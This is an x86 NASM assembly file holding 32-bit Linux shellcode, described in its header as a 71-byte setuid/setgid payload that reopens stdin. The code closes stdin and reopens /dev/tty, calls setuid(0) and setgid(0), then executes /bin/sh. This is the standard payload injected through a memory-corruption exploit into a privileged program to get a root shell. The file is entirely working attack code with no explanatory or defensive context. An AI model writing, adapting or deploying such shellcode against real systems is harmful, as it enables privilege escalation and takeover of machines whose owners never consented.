; nasm -f bin sample-02.nasm
;
; setuid, setgid, stdin reopen shellcode (71 bytes)

bits 32

global _start 

section .text
_start:
    add     esp, 0x18

    ; close(0)
    xor     eax, eax 
    xor     ebx, ebx
    mov     al, 6
    int     0x80

    ; open("/dev/tty", O_RDWR | )
    push    ebx 
    push    0x7974742f          ; /tty
    push    0x7665642f          ; /dev
    mov     ebx, esp 
    xor     ecx, ecx 
    mov     cx, 0x2712
    mov     al, 5
    int     0x80

    ; setuid(0)
    push    0x17
    pop     eax
    xor     ebx, ebx
    int     0x80

    ; setgid(0)
    push    0x2e
    pop     eax
    push    ebx
    int     0x80

    ; execve("/bin/sh", ["/bin/sh"], NULL)
    xor     eax, eax
    push    eax
    push    0x68732f2f          ; //sh
    push    0x6e69622f          ; /bin
    mov     ebx, esp
    push    eax
    push    ebx
    mov     ecx, esp
    cdq                       
    mov     al, 0xb
    int     0x80